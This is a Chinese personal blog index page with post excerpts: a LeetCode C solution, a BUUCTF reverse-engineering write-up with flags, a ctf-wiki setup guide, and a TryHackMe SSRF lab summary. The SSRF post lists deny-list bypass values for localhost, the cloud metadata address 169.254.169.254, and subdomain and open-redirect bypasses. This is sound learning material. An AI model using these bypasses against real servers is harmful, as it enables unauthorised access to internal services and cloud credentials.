<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="May the Force be with you.">
<meta property="og:type" content="website">
<meta property="og:title" content="hxt&#39;s Blog">
<meta property="og:url" content="http://example.com/page/14/index.html">
<meta property="og:site_name" content="hxt&#39;s Blog">
<meta property="og:description" content="May the Force be with you.">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="hxt">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/14/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>hxt's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>


<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">hxt's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/05/%E5%AF%BB%E6%89%BE%E4%B8%A4%E4%B8%AA%E6%AD%A3%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/07/05/%E5%AF%BB%E6%89%BE%E4%B8%A4%E4%B8%AA%E6%AD%A3%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0/" class="post-title-link" itemprop="url">寻找两个正序数组的中位数</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-07-05 17:34:10" itemprop="dateCreated datePublished" datetime="2023-07-05T17:34:10+08:00">2023-07-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/LeetCode/" itemprop="url" rel="index"><span itemprop="name">LeetCode</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" itemprop="url" rel="index"><span itemprop="name">数据结构</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>题目地址：https://leetcode.cn/problems/median-of-two-sorted-arrays/</p>
<blockquote>
<p>题目描述：</p>
<p>给定两个大小分别为 <code>m</code> 和 <code>n</code>
的正序（从小到大）数组 <code>nums1</code> 和
<code>nums2</code>。请你找出并返回这两个正序数组的
<strong>中位数</strong> 。</p>
<p>算法的时间复杂度应该为 <code>O(log (m+n))</code> 。</p>
<p>示例 ：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums1 = [1,3], nums2 = [2]</span><br><span class="line">输出：2.00000</span><br><span class="line">解释：合并数组 = [1,2,3] ，中位数 2</span><br></pre></td></tr></tbody></table></figure>
</blockquote>
<p>第五行，我一开始的写法是</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i,j; i&lt;nums1Size, j&lt;nums2Size;)</span><br></pre></td></tr></tbody></table></figure>
<p>这里我犯了一个低级错误，怎么提交都不对<span class="github-emoji"><span>😓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>，正确写法为：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i,j; i&lt;nums1Size &amp;&amp; j&lt;nums2Size;)</span><br></pre></td></tr></tbody></table></figure>
<p>完整代码：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> <span class="title function_">findMedianSortedArrays</span><span class="params">(<span class="type">int</span>* nums1, <span class="type">int</span> nums1Size, <span class="type">int</span>* nums2, <span class="type">int</span> nums2Size)</span>{</span><br><span class="line">    <span class="type">int</span> nums3[nums1Size + nums2Size]; <span class="comment">//定义新数组</span></span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,k=<span class="number">0</span>;</span><br><span class="line">    <span class="type">double</span> result;</span><br><span class="line">    <span class="keyword">for</span> (i,j; i&lt;nums1Size &amp;&amp; j&lt;nums2Size;){ <span class="comment">//讲较小的值放入nums3中</span></span><br><span class="line">        <span class="keyword">if</span> (nums1[i] &lt;= nums2[j]){</span><br><span class="line">            nums3[k] = nums1[i];</span><br><span class="line">            i++;</span><br><span class="line">            k++;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span>{</span><br><span class="line">            nums3[k] = nums2[j];</span><br><span class="line">            j++;</span><br><span class="line">            k++;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(j,k; j&lt; nums2Size; j++,k++){ <span class="comment">//nums1Size &lt; nums2Size 时，会执行该代码</span></span><br><span class="line">        nums3[k] = nums2[j];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i,k; i&lt; nums1Size; i++,k++){ <span class="comment">//nums1Size &gt; nums2Size 时，会执行该代码</span></span><br><span class="line">        nums3[k] = nums1[i];</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> m=<span class="number">0</span>;</span><br><span class="line">    m = nums1Size + nums2Size;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(m%<span class="number">2</span> == <span class="number">0</span>){ <span class="comment">//元素总数为偶数</span></span><br><span class="line">        result = (nums3[m/<span class="number">2</span>] + nums3[m/<span class="number">2</span><span class="number">-1</span>])/<span class="number">2.0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> { <span class="comment">//元素总数为奇数</span></span><br><span class="line">        result = nums3[m/<span class="number">2</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/27/Reverse%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/27/Reverse%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">Reverse做题记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-06-27 15:14:32" itemprop="dateCreated datePublished" datetime="2023-06-27T15:14:32+08:00">2023-06-27</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reverse/" itemprop="url" rel="index"><span itemprop="name">Reverse</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>36k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>32 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="buuctf">BUUCTF</h2>
<h3 id="easyre">1.easyre</h3>
<p>下载压缩包，用Exeinfope查看文件架构信息： <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/b454fe47178e4ece86e9b4a8e69fb35f.png" alt="在这里插入图片描述">
可知文件是64位，将其拖进IDA64中，直接得到flag <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/6cd55322012c45b5a4158bc1fd28cc6f.png" alt="在这里插入图片描述"></p>
<h3 id="reverse1">2.reverse1</h3>
<p>先判断文件为64位，用IDA64打开文件 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/1d017b7ed51047ae869a046f91c4ddb6.png" alt="在这里插入图片描述">
切换为文本界面也没有什么特殊字符，然后通过Shift+F12打开String窗口 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/dde454aebd1b46e79d022ad822f261cc.png" alt="在这里插入图片描述"> 找到关键字符，双击后进入反汇编的文本界面
<img src="https://img-blog.csdnimg.cn/d3cc6d422d964c509323e8207faaed6d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASF94dA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"> 按Ctrl+X找到该地址的函数 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/c333353c6fb4480e8c2dbd4b823f8966.png" alt="在这里插入图片描述"> 双击Address一栏下方的地址 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/1d3482dc52df48cab2dd09ce412e8036.png" alt="在这里插入图片描述"> 按F5进入伪代码窗口 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/dd3012e2c7494ea48b8dd0cc52510ba5.png" alt="在这里插入图片描述">
阅读伪代码可知Str1和Str2进行了比较，当两者不相同是输出“this is the right
flag!”。将“111”和“48”以char类型显示 <img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/18610c3416d643b0bb474f51956cb6b7.png" alt="在这里插入图片描述">
可知"hello_world"中的'o'被替换为了'0'，所以flag为flag{hell0_w0rld}。</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2023/06/27/Reverse%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/25/%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2ctf-wiki/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/25/%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2ctf-wiki/" class="post-title-link" itemprop="url">本地部署ctf-wiki</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-06-25 23:20:16" itemprop="dateCreated datePublished" datetime="2023-06-25T23:20:16+08:00">2023-06-25</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>955</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>首先打开 ctf-wiki 的GitHub仓库
https://github.com/ctf-wiki/ctf-wiki/blob/master/README-zh_CN.md</p>
<p>根据步骤操作，这里我用的是第一种方法：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 1. clone</span><br><span class="line">git clone https://github.com/ctf-wiki/ctf-wiki.git</span><br><span class="line"># 2. requirements</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"># generate static file in site/</span><br><span class="line">python3 scripts/docs.py build-all        &lt;-----如果是Windows，使用'python'而不是'python3'</span><br><span class="line"># deploy at http://127.0.0.1:8008</span><br><span class="line">python3 scripts/docs.py serve</span><br></pre></td></tr></tbody></table></figure>
<p>在运行<code>python scripts/docs.py build-all</code>时发生报错：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AttributeError: module 'jinja2' has no attribute 'contextfilter'</span><br></pre></td></tr></tbody></table></figure>
<p>根据这篇<a target="_blank" rel="noopener" href="https://forums.docker.com/t/jinja-mkdocs-issue-breaks-docker101tutorial/122671">文章</a>，我进行了修改，首先使用<code>pip uninstall jinja2</code>删除存在的<code>jinja2</code>，然后打开<code>requirements.txt</code>文件，在最后一行添加<code>jinja2==3.0.3</code>，重新运行<code>pip install -r requirements.txt</code>，然后再次运行<code>python scripts/docs.py build-all</code>，成功解决报错，继续运行<code>python scripts/docs.py serve</code>，会出现</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Warning: this is a very simple server.</span><br><span class="line">For development, use the command live instead.</span><br><span class="line">This is here only to preview a site with translations already built.</span><br><span class="line">Make sure you run the build-all command first.</span><br><span class="line">Serving at: http://127.0.0.1:8008</span><br></pre></td></tr></tbody></table></figure>
<p>此时在浏览器中打开<code>http://127.0.0.1:8008</code>即可访问ctf-wiki。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/10/SSRF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/10/SSRF/" class="post-title-link" itemprop="url">SSRF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-06-10 16:01:30" itemprop="dateCreated datePublished" datetime="2023-06-10T16:01:30+08:00">2023-06-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TryHackMe实验房间：https://tryhackme.com/room/ssrfqi</p>
<p>参考https://www.cnblogs.com/Hekeats-L/p/16919147.html</p>
<h2 id="introduction">Introduction</h2>
<h3 id="what-is-an-ssrf">What is an SSRF</h3>
<p>SSRF 是 服务端请求伪造（Server-Side Request
Forgery）的缩写。这个漏洞使得恶意用户能够使web服务器向该恶意用户选择的资源提出额外的HTTP请求。攻击者通过滥用服务器功能来访问或操作无法被直接访问的信息。</p>
<h3 id="types-of-ssrf">Types of SSRF</h3>
<ol type="1">
<li>第一种是常规类型的 SSRF，数据会返回给攻击者</li>
<li>第二种是 <strong>Blind SSRF</strong>
，攻击者无法看见相关信息和数据</li>
</ol>
<h3 id="whats-the-impact">What's the impact</h3>
<p>SSRF攻击可能会导致以下情况的发生：</p>
<ul>
<li>能够访问未经授权的区域</li>
<li>能够访问客户/组织的数据</li>
<li>能够进入内网</li>
<li>泄露身份验证令牌/凭证</li>
</ul>
<h2 id="finding-an-ssrf">Finding an SSRF</h2>
<p>潜在的SSRF漏洞可以通过多种方式在web应用程序中发现，下面是四个常见的示例：</p>
<ol type="1">
<li><p>地址栏中的参数使用完整的 URL：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230104111655039.png" alt="image-20230104111655039">
<figcaption aria-hidden="true">image-20230104111655039</figcaption>
</figure></li>
<li><p>表单中的<strong>隐藏</strong>字段：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230104111818606.png" alt="image-20230104111818606">
<figcaption aria-hidden="true">image-20230104111818606</figcaption>
</figure></li>
<li><p>地址栏中的参数使用部分 URL 例如主机名：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230104111932658.png" alt="image-20230104111932658">
<figcaption aria-hidden="true">image-20230104111932658</figcaption>
</figure></li>
<li><p>只包含路径的 URL：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230104112014478.png" alt="image-20230104112014478">
<figcaption aria-hidden="true">image-20230104112014478</figcaption>
</figure></li>
</ol>
<p>上述示例是一些比较容易利用的漏洞，这些位置都是经过大量反复实验得到的。</p>
<p>如果是 <strong>Blind SSRF</strong>
，则不会有输出反馈，这时需要用到外部 HTTP
记录工具来监视请求，例如：网站https://requestbin.com/，你自己的
HTTP服务器，以及 Burp Suite 的 Collaborator 客户端。</p>
<h2 id="defeating-common-ssrf-defenses绕过ssrf防御">Defeating Common
SSRF Defenses（绕过SSRF防御）</h2>
<p>安全意识更高的开发人员会在其应用程序中添加 SSRF
的漏洞检测，通常有两种方式：建立拒绝列表（deny
list）；建立允许列表（allow list）。</p>
<h3 id="deny-list">Deny LIst</h3>
<p>拒绝列表是指除了列表中指定的资源与特定模式匹配的资源外，其他所有请求均接受。Web应用程序可以使用拒绝列表来保护敏感的端点、IP地址或域名不被公众访问，同时允许访问其他公开的资源。限制访问的特定端点是
<strong>localhost</strong>
，它可能包含服务器性能数据或一些敏感信息，因此
<strong>localhost</strong>、<strong>127.0.0.1</strong>
等域名可能会被记录在拒绝列表中。攻击者可以使用一些替代性的字符串表示
<strong>localhost</strong>
，例如：<code>0</code>，<code>0.0.0.0</code>，<code>0000</code>，<code>127.1</code>，<code>127.*.*.*</code>，<code>2130706433</code>，<code>017700000001</code>，或具有解析为<code>127.0.0.1</code>的
DNS 记录的子域名，例如<code>127.0.0.1.nip.io</code>。</p>
<p>此外，在云环境中，阻止对IP地址<code>169.254.169.254</code>的访问十分重要，该访问包含用于已部署的云服务器的元数据，元数据中可能包含敏感信息。攻击者可在自己的域上注册一个子域来绕过检验，该子域的DNS记录指向IP地址<code>169.254.169.254</code>。</p>
<h3 id="allow-list">Allow List</h3>
<p>除了出现在允许列表中的资源以及与特定模式匹配的资源外，其他所有的请求均不接受。例如参数中的
URL
必须以<code>https://website.thm</code>作为开头。攻击者可以通过在自己的域上注册子域(例如：<code>https://website.thm.attackers-domain.thm</code>)来绕过检验。应用程序逻辑上允许该子域输入并允许攻击者控制内部HTTP请求。</p>
<h3 id="open-redirect开放重定向">Open Redirect（开放重定向）</h3>
<p>如果上述方法均不起作用，攻击者还可以使用<strong>开放重定向</strong>这一技巧。开放重定向是服务器上的一个端点，网站访问者会被自动定向到另一个网址。以链接<code>https://website.thm/link?url=https://tryhackme.com</code>为例，创建此端点是为了记录访问者单击此链接的次数。但是如果该网站具有严格的规则，仅允许
URL
以<code>https://website.thm/</code>作为开头，那么可能存在一个潜在的SSRF漏洞，攻击者可以尝试将目标服务器的内部HTTP请求重定向到攻击者输入的域。</p>
<p>SSRF示例详见https://www.cnblogs.com/Hekeats-L/p/16919147.html</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/10/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/10/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE/" class="post-title-link" itemprop="url">Subdomain Enumeration（子域名枚举）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-06-10 15:54:50" itemprop="dateCreated datePublished" datetime="2023-06-10T15:54:50+08:00">2023-06-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>719</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
